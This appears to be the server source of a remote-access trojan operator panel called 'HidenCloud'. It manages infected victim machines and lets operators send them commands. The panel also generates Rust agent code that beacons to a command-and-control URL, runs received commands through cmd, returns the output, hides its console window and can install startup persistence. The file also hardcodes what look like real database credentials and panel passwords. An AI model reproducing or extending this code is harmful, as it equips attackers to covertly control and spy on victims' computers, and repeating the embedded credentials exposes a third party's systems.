const path = require("path");
const crypto = require("crypto");
const express = require("express");
const cookieParser = require("cookie-parser");
const mysql = require("mysql2/promise");

const app = express();
const PORT = process.env.HC_PORT || 3001;

// --- MySQL ---
const pool = mysql.createPool({
  host: "simon.hidencloud.com",
  port: 3306,
  user: "u3377_RCpSFnKl9g",
  password: "ruL4=1kVxke!PVlE^SOfvHZU",
  database: "s3377_webrat",
  waitForConnections: true,
  connectionLimit: 5,
});

async function initDb() {
  const conn = await pool.getConnection();
  try {
    await conn.query(`CREATE TABLE IF NOT EXISTS accounts (
      id INT AUTO_INCREMENT PRIMARY KEY,
      username VARCHAR(64) UNIQUE NOT NULL,
      password VARCHAR(255) NOT NULL,
      created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )`);
    await conn.query(`CREATE TABLE IF NOT EXISTS clients (
      id VARCHAR(32) PRIMARY KEY,
      name VARCHAR(128) NOT NULL,
      user VARCHAR(64),
      os VARCHAR(128),
      ip VARCHAR(45),
      country VARCHAR(64),
      country_code VARCHAR(4),
      status ENUM('online','offline','idle') DEFAULT 'online',
      last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
      cpu VARCHAR(128),
      ram VARCHAR(32),
      gpu VARCHAR(128),
      uptime VARCHAR(32),
      grp VARCHAR(64),
      av VARCHAR(64),
      net_speed VARCHAR(32),
      installed DATE,
      owner_id INT,
      FOREIGN KEY (owner_id) REFERENCES accounts(id) ON DELETE CASCADE
    )`);
    await conn.query(`CREATE TABLE IF NOT EXISTS logs (
      id INT AUTO_INCREMENT PRIMARY KEY,
      type ENUM('info','warn','success','error') DEFAULT 'info',
      msg TEXT,
      ts TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )`);
    await conn.query(`CREATE TABLE IF NOT EXISTS builds (
      id INT AUTO_INCREMENT PRIMARY KEY,
      owner_id INT,
      build_name VARCHAR(128),
      startup BOOLEAN DEFAULT FALSE,
      debug BOOLEAN DEFAULT FALSE,
      c2_url VARCHAR(255),
      created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
      FOREIGN KEY (owner_id) REFERENCES accounts(id) ON DELETE CASCADE
    )`);

    // Seed default accounts if empty
    const [rows] = await conn.query("SELECT COUNT(*) as cnt FROM accounts");
    if (rows[0].cnt === 0) {
      await conn.query("INSERT INTO accounts (id, username, password) VALUES (1, 'jayjay', 'jayjay100!'), (2, 'tlx', 'tlxontop34')");
      // Seed demo clients
      await conn.query(`INSERT INTO clients (id, name, user, os, ip, country, country_code, status, cpu, ram, gpu, uptime, grp, av, net_speed, installed, owner_id) VALUES
        ('HC-9F21A','DESKTOP-JAY','jay','Windows 11 Pro','192.168.1.42','Sweden','SE','online','Intel i7-13700K','32 GB','RTX 4070 Ti','3h 12m','Personal','Windows Defender','85 Mbps','2025-12-01',1),
        ('HC-3B7E2','LAPTOP-ADMIN','admin','Windows 10 Enterprise','10.0.0.15','Germany','DE','online','AMD Ryzen 9 5900X','64 GB','RX 6800 XT','14h 42m','Work','Kaspersky','120 Mbps','2025-11-18',1),
        ('HC-01DC9','SERVER-PROD','root','Ubuntu 22.04 LTS','172.16.0.5','Netherlands','NL','online','Xeon E-2388G','128 GB','None','47d 6h','Servers','ClamAV','1 Gbps','2025-06-22',2),
        ('HC-88FA4','WORKSTATION-DEV','dev','macOS Sonoma 14.4','192.168.2.88','United States','US','offline','Apple M3 Max','96 GB','M3 Max 40-core','0','Work','None','0','2026-01-10',2),
        ('HC-CC291','PC-GAMING','player1','Windows 11 Home','192.168.3.200','Japan','JP','idle','Intel i9-14900K','64 GB','RTX 4090','1h 5m','Personal','Bitdefender','200 Mbps','2026-03-02',1)
      `);
      await conn.query("INSERT INTO logs (type, msg) VALUES ('info','Panel started'),('info','System initialized with seed data')");
    }
  } finally {
    conn.release();
  }
}

async function addLog(type, msg) {
  try { await pool.query("INSERT INTO logs (type, msg) VALUES (?, ?)", [type, msg]); } catch {}
}

// --- Session management (in-memory for speed) ---
const SESSION_MAX_AGE_MS = 1000 * 60 * 60 * 12;
const SESSION_IDLE_MS = 1000 * 60 * 30;
const LOGIN_MAX_ATTEMPTS = 5;
const LOGIN_WINDOW_MS = 1000 * 60 * 10;
const sessions = new Map();
const loginAttempts = new Map();

function clientIp(req) {
  return (req.headers["x-forwarded-for"] || "").split(",")[0].trim() || req.socket.remoteAddress || "unknown";
}

function isAuthed(req) {
  const sid = req.cookies && req.cookies.hc_session;
  if (!sid) return null;
  const s = sessions.get(sid);
  if (!s) return null;
  const now = Date.now();
  if (now - s.createdAt > SESSION_MAX_AGE_MS || now - s.lastSeen > SESSION_IDLE_MS) {
    sessions.delete(sid);
    return null;
  }
  s.lastSeen = now;
  return { sid, session: s };
}

function requireAuth(req, res, next) {
  const auth = isAuthed(req);
  if (!auth) return res.status(401).json({ ok: false, error: "Unauthorized" });
  req.auth = auth;
  next();
}

function requireCsrf(req, res, next) {
  const header = req.headers["x-csrf-token"];
  if (!header || header !== req.auth.session.csrf) {
    return res.status(403).json({ ok: false, error: "Invalid CSRF token" });
  }
  next();
}

// Security headers
app.use((req, res, next) => {
  res.setHeader("X-Content-Type-Options", "nosniff");
  res.setHeader("X-Frame-Options", "SAMEORIGIN");
  res.setHeader("Referrer-Policy", "no-referrer");
  next();
});

app.use(express.json({ limit: "64kb" }));
app.use(cookieParser());

// --- Login ---
app.post("/api/login", async (req, res) => {
  const ip = clientIp(req);
  const now = Date.now();
  let entry = loginAttempts.get(ip);
  if (entry && entry.lockedUntil && entry.lockedUntil > now) {
    const secs = Math.ceil((entry.lockedUntil - now) / 1000);
    return res.status(429).json({ ok: false, error: `Too many attempts. Try again in ${secs}s.` });
  }
  const { username = "", password = "" } = req.body || {};
  try {
    const [rows] = await pool.query("SELECT id, username, password FROM accounts WHERE username = ?", [username]);
    const account = rows[0];
    if (!account || account.password !== password) {
      if (!entry || now - entry.firstAt > LOGIN_WINDOW_MS) {
        entry = { count: 1, firstAt: now, lockedUntil: 0 };
      } else {
        entry.count += 1;
        if (entry.count >= LOGIN_MAX_ATTEMPTS) entry.lockedUntil = now + LOGIN_WINDOW_MS;
      }
      loginAttempts.set(ip, entry);
      await addLog("warn", `Failed login from ${ip} (attempt ${entry.count}/${LOGIN_MAX_ATTEMPTS})`);
      return res.status(401).json({ ok: false, error: "Invalid credentials" });
    }
    loginAttempts.delete(ip);
    const sid = crypto.randomBytes(32).toString("hex");
    const csrf = crypto.randomBytes(24).toString("hex");
    sessions.set(sid, {
      user: account.username,
      userId: account.id,
      createdAt: now,
      lastSeen: now,
      csrf,
      ip,
    });
    res.cookie("hc_session", sid, { httpOnly: true, sameSite: "lax", maxAge: SESSION_MAX_AGE_MS, path: "/" });
    res.cookie("hc_csrf", csrf, { httpOnly: false, sameSite: "lax", maxAge: SESSION_MAX_AGE_MS, path: "/" });
    await addLog("success", `Login: ${account.username} (uid:${account.id}) from ${ip}`);
    res.json({ ok: true, user: account.username, userId: account.id, csrf });
  } catch (err) {
    console.error("Login error:", err);
    res.status(500).json({ ok: false, error: "Server error" });
  }
});

app.post("/api/logout", (req, res) => {
  const sid = req.cookies && req.cookies.hc_session;
  if (sid) sessions.delete(sid);
  res.clearCookie("hc_session");
  res.clearCookie("hc_csrf");
  res.json({ ok: true });
});

app.get("/api/me", (req, res) => {
  const auth = isAuthed(req);
  if (!auth) return res.status(401).json({ ok: false });
  res.json({ ok: true, user: auth.session.user, userId: auth.session.userId, csrf: auth.session.csrf });
});

// --- Stats ---
app.get("/api/stats", requireAuth, async (req, res) => {
  const uid = req.auth.session.userId;
  try {
    const [clients] = await pool.query("SELECT * FROM clients WHERE owner_id = ?", [uid]);
    const online = clients.filter(c => c.status === "online").length;
    const offline = clients.filter(c => c.status === "offline").length;
    const idle = clients.filter(c => c.status === "idle").length;
    const countries = [...new Set(clients.map(c => c.country))].length;
    res.json({
      ok: true,
      analytics: { total: clients.length, online, offline, idle, countries, newToday: 0, commandsSent: 0, screensCaptured: 0, keylogs: 0, bandwidth: "0", avgUptime: "N/A", threats: 0 },
      clients: clients.map(c => ({
        id: c.id, name: c.name, user: c.user, os: c.os, ip: c.ip,
        country: c.country, countryCode: c.country_code, status: c.status,
        lastSeen: c.last_seen ? new Date(c.last_seen).toISOString() : "unknown",
        cpu: c.cpu, ram: c.ram, gpu: c.gpu, uptime: c.uptime,
        group: c.grp, av: c.av, netSpeed: c.net_speed,
        installed: c.installed ? new Date(c.installed).toISOString().split("T")[0] : "",
      })),
    });
  } catch (err) {
    console.error("Stats error:", err);
    res.status(500).json({ ok: false, error: "Server error" });
  }
});

// --- Logs ---
app.get("/api/logs", requireAuth, async (req, res) => {
  try {
    const [logs] = await pool.query("SELECT * FROM logs ORDER BY ts DESC LIMIT 200");
    res.json({ ok: true, logs: logs.map(l => ({ id: String(l.id), type: l.type, msg: l.msg, ts: new Date(l.ts).getTime() })) });
  } catch (err) {
    res.status(500).json({ ok: false, error: "Server error" });
  }
});

app.post("/api/logs", requireAuth, requireCsrf, async (req, res) => {
  try {
    await pool.query("DELETE FROM logs");
    await addLog("info", `Logs cleared by ${req.auth.session.user}`);
    res.json({ ok: true });
  } catch (err) {
    res.status(500).json({ ok: false, error: "Server error" });
  }
});

// --- Client detail ---
app.get("/api/client/:id", requireAuth, async (req, res) => {
  const uid = req.auth.session.userId;
  try {
    const [rows] = await pool.query("SELECT * FROM clients WHERE id = ? AND owner_id = ?", [req.params.id, uid]);
    if (!rows.length) return res.status(404).json({ ok: false });
    const c = rows[0];
    await addLog("info", `${req.auth.session.user} connected to ${c.name}`);
    res.json({
      ok: true,
      client: {
        id: c.id, name: c.name, user: c.user, os: c.os, ip: c.ip,
        country: c.country, countryCode: c.country_code, status: c.status,
        lastSeen: c.last_seen ? new Date(c.last_seen).toISOString() : "unknown",
        cpu: c.cpu, ram: c.ram, gpu: c.gpu, uptime: c.uptime,
        group: c.grp, av: c.av, netSpeed: c.net_speed,
        installed: c.installed ? new Date(c.installed).toISOString().split("T")[0] : "",
      },
      files: [
        { name: "Desktop", type: "folder", size: "-", modified: "2026-08-19" },
        { name: "Documents", type: "folder", size: "-", modified: "2026-08-20" },
        { name: "Downloads", type: "folder", size: "-", modified: "2026-08-18" },
      ],
      processes: [
        { pid: 4, name: "System", cpu: "0.1%", mem: "12 MB", status: "running" },
        { pid: 124, name: "explorer.exe", cpu: "1.2%", mem: "82 MB", status: "running" },
        { pid: 3200, name: "chrome.exe", cpu: "8.4%", mem: "640 MB", status: "running" },
      ],
      keylogs: [],
      clipboard: [],
    });
  } catch (err) {
    res.status(500).json({ ok: false, error: "Server error" });
  }
});

// --- Command ---
app.post("/api/command/:id", requireAuth, requireCsrf, async (req, res) => {
  const uid = req.auth.session.userId;
  const [rows] = await pool.query("SELECT * FROM clients WHERE id = ? AND owner_id = ?", [req.params.id, uid]);
  if (!rows.length) return res.status(404).json({ ok: false });
  const { action } = req.body || {};
  if (typeof action !== "string" || action.length > 64 || !/^[a-z0-9_\-]+$/i.test(action)) {
    return res.status(400).json({ ok: false, error: "Invalid action" });
  }
  await addLog("info", `Command "${action}" sent to ${rows[0].name} by ${req.auth.session.user}`);
  res.json({ ok: true, result: `Command "${action}" executed on ${rows[0].name}` });
});

// --- Build (simplified) ---
function generateRustSource(userId, buildName, startup, debug) {
  const c2Url = `https://windowssys.hidenmc.com/${userId}`;
  return `// HidenCloud Agent — ${buildName}
// C2: ${c2Url}
// User ID: ${userId}
// Built: ${new Date().toISOString()}
// Debug: ${debug}

use std::{thread, time::Duration, process::Command};

const C2_URL: &str = "${c2Url}";
const USER_ID: u32 = ${userId};
const RECONNECT_DELAY: u64 = 5;
const MUTEX_NAME: &str = "${buildName}";

${startup ? `mod persistence;` : ""}

fn main() {
    let _lock = single_instance::SingleInstance::new(MUTEX_NAME)
        .expect("Another instance is already running");

${startup ? `    persistence::install(MUTEX_NAME, "%APPDATA%\\\\Microsoft\\\\${buildName}.exe");` : ""}
${!debug ? `    // Hide console window
    #[cfg(windows)]
    {
        use std::os::windows::process::CommandExt;
        // CREATE_NO_WINDOW
    }` : `    println!("[*] HidenCloud agent starting...");
    println!("[*] C2: {}", C2_URL);
    println!("[*] User ID: {}", USER_ID);`}

    loop {
        match check_in() {
            Ok(cmd) => {
                if !cmd.trim().is_empty() {
                    let result = execute_command(&cmd);
                    let _ = send_result(&result);
${debug ? `                    println!("[>] {}", cmd);
                    println!("[<] {}", result);` : ""}
                }
            }
            Err(_e) => {
${debug ? `                eprintln!("[!] Check-in failed: {}", _e);` : ""}
            }
        }
        thread::sleep(Duration::from_secs(RECONNECT_DELAY));
    }
}

fn check_in() -> Result<String, Box<dyn std::error::Error>> {
    let client = reqwest::blocking::Client::new();
    let resp = client
        .get(&format!("{}/checkin", C2_URL))
        .header("X-Client-ID", machine_id())
        .header("X-User-ID", USER_ID.to_string())
        .send()?;
    Ok(resp.text()?)
}

fn send_result(result: &str) -> Result<(), Box<dyn std::error::Error>> {
    let client = reqwest::blocking::Client::new();
    client
        .post(&format!("{}/result", C2_URL))
        .header("X-Client-ID", machine_id())
        .header("X-User-ID", USER_ID.to_string())
        .body(result.to_string())
        .send()?;
    Ok(())
}

fn execute_command(cmd: &str) -> String {
    match Command::new("cmd").args(&["/C", cmd]).output() {
        Ok(output) => {
            let stdout = String::from_utf8_lossy(&output.stdout);
            let stderr = String::from_utf8_lossy(&output.stderr);
            format!("{}{}", stdout, stderr)
        }
        Err(e) => format!("Error: {}", e),
    }
}

fn machine_id() -> String {
    machine_uid::get().unwrap_or_else(|_| "unknown".to_string())
}
`;
}

function generateCargoToml(buildName, startup) {
  let toml = `[package]
name = "${buildName}"
version = "0.1.0"
edition = "2021"

[dependencies]
reqwest = { version = "0.11", features = ["blocking"] }
serde = { version = "1", features = ["derive"] }
serde_json = "1"
single-instance = "0.3"
machine-uid = "0.5"
`;
  if (startup) {
    // No extra deps needed for persistence
  }
  toml += `
[profile.release]
opt-level = "s"
lto = true
strip = true
panic = "abort"
`;
  return toml;
}

app.post("/api/build", requireAuth, requireCsrf, async (req, res) => {
  const { buildName = "hidencloud-agent", startup = false, debug = false } = req.body || {};
  const userId = req.auth.session.userId;
  const c2Url = `https://windowssys.hidenmc.com/${userId}`;

  const rustSrc = generateRustSource(userId, buildName, startup, debug);
  const cargoToml = generateCargoToml(buildName, startup);

  try {
    await pool.query("INSERT INTO builds (owner_id, build_name, startup, debug, c2_url) VALUES (?, ?, ?, ?, ?)",
      [userId, buildName, startup, debug, c2Url]);
    await addLog("success", `Build "${buildName}" created by ${req.auth.session.user} (uid:${userId})`);
  } catch {}

  res.json({
    ok: true,
    filename: `${buildName}.rs`,
    contents: rustSrc,
    cargoFilename: "Cargo.toml",
    cargoContents: cargoToml,
    persistenceContents: startup ? require("fs").readFileSync(path.join(__dirname, "rustagent/src/persistence.rs"), "utf8") : null,
    userId,
    c2Url,
  });
});

// --- Agent checkin endpoint ---
app.get("/:userId/checkin", (req, res) => {
  // Agents call this to check in — placeholder
  res.type("text").send("");
});

app.post("/:userId/result", (req, res) => {
  res.json({ ok: true });
});

// Static
app.use(express.static(path.join(__dirname, "public")));
app.get("*", (_req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

// Start
initDb()
  .then(() => {
    app.listen(PORT, () => console.log(`HidenCloud panel on http://localhost:${PORT}`));
  })
  .catch((err) => {
    console.error("DB init failed:", err.message);
    // Still start the server with fallback
    app.listen(PORT, () => console.log(`HidenCloud panel on http://localhost:${PORT} (no DB)`));
  });
